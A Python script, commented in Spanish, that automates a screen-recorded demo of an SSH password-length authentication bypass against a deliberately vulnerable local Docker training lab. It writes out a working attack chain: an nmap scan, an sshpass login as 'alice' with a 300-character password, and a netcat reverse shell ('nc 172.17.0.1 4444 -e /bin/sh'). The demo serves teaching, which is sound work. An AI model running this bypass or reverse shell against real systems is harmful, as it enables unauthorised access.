#!/usr/bin/env python3
"""
demo_sshole.py — Demo CVE-2026-123158 ("sshole") COMPLETA dentro de la VM: nmap + SSH + reverse shell
contra el laboratorio "Eseeseache" de BunkerLabs (dockerlabs.es/bunkerlabs), desplegado en Docker.

    python demo_sshole.py [nombre_toma]        (def. sshole-AAAAMMDD-HHMM)

Marco ético: laboratorio deliberadamente vulnerable, descargado de una plataforma de formación en
pentesting, desplegado SOLO en Docker local (bridge 172.17.0.0/16, no expuesto a internet). Autor
del lab: El Pingüino de Mario (BunkerLabs). Ver 00-recon.md para la vulnerabilidad explicada.

Hace: despliega el contenedor (NO grabado, es preparación) → dos terminales lado a lado → grabación →
Acto 1 (nmap) → Acto 2 (login SSH como alice con contraseña de 300 caracteres, `id`) → Acto 3
(listener + reverse shell) → trae el .mp4, el registro .steps.jsonl y el mapa de edición .mapa.md.
Cada paso se verifica (texto en pantalla); si uno falla, se detiene y queda marcado en el mapa.
Entrada humana siempre (vm_control.type_in/move/click).
"""
import os
import re
import sys
import time
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "herramientas"))
import vm_control as v  # noqa: E402  (también pone nucleo/ en el path)
from nucleo.rutas import SHORTS  # noqa: E402

LAB_DIR = "~/lab-ssh"
TAR = "eseseache.tar"
CONTAINER = "eseseache_container"
GATEWAY = "172.17.0.1"       # docker0 del propio Kali: el contenedor lo alcanza para la reverse shell
LPORT = "4444"

# Geometría EXACTA de cada terminal (la misma que place_id): el Short la usa para letterbox SIN recortar.
# El ratón no se mueve mientras se teclea, así que el foco de cámara debe ser esta REGIÓN completa, no un
# punto — un punto con el recorte fijo de 816 px podía dejar fuera el borde derecho de una línea larga
# (medido en sshole-run7: "22/tcp" salía como "cp", "172.17.0.2" como "2.17.0.2").
#
# TAMAÑO DE LETRA, no recorte más estrecho, es la palanca para "se ve pequeño" (pedido explícito del
# usuario: TODAS las demos deben verse grandes, no solo dos comandos sueltos). Un recorte más estrecho
# (p. ej. 700 de 960 px) solo es seguro si MIDES que cada línea cabe — frágil y hay que repetirlo por cada
# comando nuevo. Subir `fontSize` en ~/.config/qterminal.org/qterminal.ini (18 -> 24, aplicado una vez por
# VM) agranda TODO sin ese riesgo: el texto que no cabe simplemente hace más líneas, nunca se sale de la
# ventana. Con 24pt el rect COMPLETO (960×973 -> letterbox ×1,125) ya sale más grande que el recorte
# estrecho de antes a 18pt (×1,54) — medido, ver 09-conducir-apps-kali.md.
ATK_RECT = (0, 39, 960, 973)
LIS_RECT = (960, 39, 960, 973)


def focus_rect(rect, why):
    x, y, w, h = rect
    v.focus(x + w // 2, y + h // 2, why, w=w, h=h)


def clear_and_focus(rect, why):
    """Limpia la terminal (Ctrl+L, instantáneo: no consume tiempo de toma) y fija el foco en `rect`: el
    siguiente comando aparece SOLO, arriba del todo, en vez de enterrado bajo el resultado anterior."""
    v.ssh("xdotool key ctrl+l")
    time.sleep(0.3)
    focus_rect(rect, why)


def verificar(ok, msg):
    if not ok:
        v.die("VERIFICACIÓN FALLIDA: " + msg)


def deploy():
    """Despliega el contenedor desde cero (limpio) y devuelve su IP. NO se graba: es preparación (Fase 0).

    NO se usa `auto_deploy.sh` del laboratorio (que es solo `docker load` + `docker run` + un
    `while true; sleep 1` para esperar a que el usuario pulse Ctrl+C): lanzarlo en segundo plano por SSH
    (con `nohup`, `setsid`, o cualquier variante) se cuelga el canal SSH de forma indeterminista cuando
    de por medio hay `sudo` con `use_pty` (medido: a veces vuelve en <1s, a veces nunca — mismo comando
    exacto). Se replican sus dos pasos (`docker load`, `docker run`) EN PRIMER PLANO y SÍNCRONOS, igual
    que cualquier otro `sudo docker ...` de este proyecto (esos nunca se han colgado, toda la sesión)."""
    v.ssh(f"sudo docker rm -f {CONTAINER} >/dev/null 2>&1", check=False)
    v.ssh("sudo docker rmi -f eseseache >/dev/null 2>&1", check=False)
    v.ssh(f"cd {LAB_DIR} && sudo docker load -i {TAR}", capture=True, timeout=60)
    v.ssh(f"sudo docker run -d --name {CONTAINER} eseseache", capture=True, timeout=30)
    ip = v.ssh(f"sudo docker inspect -f '{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}"
              f"{{{{end}}}}' {CONTAINER}", capture=True, timeout=15)
    if not re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
        v.die(f"no se pudo obtener la IP del contenedor (salió: {ip!r})")
    return ip


def main():
    nombre = sys.argv[1] if len(sys.argv) > 1 else datetime.now().strftime("sshole-%Y%m%d-%H%M")

    print("desplegando el laboratorio (sin grabar)...")
    ip = deploy()
    print("IP de la víctima:", ip)
    # el host key de la imagen es el MISMO en cada despliegue (se genera al construir la imagen, no al
    # arrancar el contenedor): limpiar el known_hosts de la IP por si quedó uno de otro contenedor previo
    v.ssh(f"ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '{ip}' >/dev/null 2>&1", check=False)

    atacante = v.launch_terminal("Atacante")
    listener = v.launch_terminal("Listener")
    v.place_id(atacante, 0, 39, 960, 973)
    v.place_id(listener, 960, 39, 960, 973)
    v.activate_id(atacante)

    v.take_start(nombre)
    v.rec_start()
    focus_rect(ATK_RECT, "inicio: terminal Atacante")   # ANTES del primer mark: cubre también el arranque
    try:
        v.mark("Acto 1: reconocimiento con nmap")
        v.type_in(atacante, f"nmap -sV -sC -p- --min-rate 2000 {ip}", wpm=42, typos=0.015, seed=1)
        v.ssh("xdotool key Return")
        verificar(v.waitfor("Nmap done", 25), "nmap no terminó")
        verificar(v.waitfor("ssh", 5), "no se ve el servicio ssh en el resultado")
        time.sleep(4)                                               # pausa de lectura: puerto y versión

        v.mark("Acto 2: generamos la contraseña de 300 caracteres")
        clear_and_focus(ATK_RECT, "comando de la contraseña, limpio y arriba del todo")
        v.type_in(atacante, """PASS=$(python3 -c "print('A'*300)")""", wpm=42, typos=0.01, seed=2)
        v.ssh("xdotool key Return")
        time.sleep(1.5)

        v.mark("Acto 2b: login SSH como alice y verificación con id")
        cmd_id = (f'sshpass -p "$PASS" ssh -o StrictHostKeyChecking=accept-new '
                  f'-o PreferredAuthentications=password alice@{ip} id')
        v.type_in(atacante, cmd_id, wpm=42, typos=0.01, seed=3)
        v.ssh("xdotool key Return")
        verificar(v.waitfor("uid=1000(alice)", 10), "el bypass no devolvió uid=1000(alice)")
        time.sleep(3)

        v.mark("Acto 3: preparamos el listener")
        v.activate_id(listener)
        clear_and_focus(LIS_RECT, "comando nc -lvnp, limpio y arriba del todo")
        v.type_in(listener, f"nc -lvnp {LPORT}", wpm=45, typos=0.01, seed=4)
        v.ssh("xdotool key Return")
        verificar(v.waitfor("listening on", 8), "el listener no arrancó")
        time.sleep(4)                                               # se pidió mostrarlo más tiempo (antes 1.5s)

        v.mark("Acto 3b: disparamos la reverse shell")
        v.activate_id(atacante)
        v.ssh("xdotool key ctrl+l")                                 # limpio, pero rect COMPLETO: comando largo
        time.sleep(0.3)
        focus_rect(ATK_RECT, "terminal Atacante: disparo de la reverse shell")
        cmd_rs = (f'sshpass -p "$PASS" ssh -o StrictHostKeyChecking=accept-new '
                  f'-o PreferredAuthentications=password alice@{ip} "nc {GATEWAY} {LPORT} -e /bin/sh"')
        v.type_in(atacante, cmd_rs, wpm=42, typos=0.01, seed=5)
        time.sleep(1.5)                                             # pausa dramática antes de ejecutar
        v.ssh("xdotool key Return")

        v.mark("Acto 3c: shell interactiva en el listener")
        v.activate_id(listener)
        focus_rect(LIS_RECT, "terminal Listener: shell remota")
        verificar(v.waitfor("connect to", 10), "no llegó la conexión de vuelta")
        time.sleep(1)
        v.type_in(listener, "id", wpm=42, typos=0, seed=6)
        v.ssh("xdotool key Return")
        verificar(v.waitfor("uid=1000(alice)", 8), "la reverse shell no responde como alice")
        time.sleep(1)
        v.type_in(listener, "hostname; cat /etc/os-release | head -1", wpm=42, typos=0, seed=7)
        v.ssh("xdotool key Return")
        time.sleep(4)
        v.mark("Cierre")
    finally:
        v.take_end()

    print("limpiando la máquina (fuera de grabación)...")
    v.ssh(f"sudo docker rm -f {CONTAINER} >/dev/null 2>&1", check=False)

    script = os.path.join(SHORTS, "short_desde_toma.py")  # ruta del repo: nucleo/rutas.py
    import subprocess
    subprocess.run([sys.executable, script, nombre,
                    "--titulo", "CVE-SSH-Pihole-Como-Entrar-Sin-Contrasena-Y-Sacar-Reverse-Shell"], check=True)


if __name__ == "__main__":
    main()
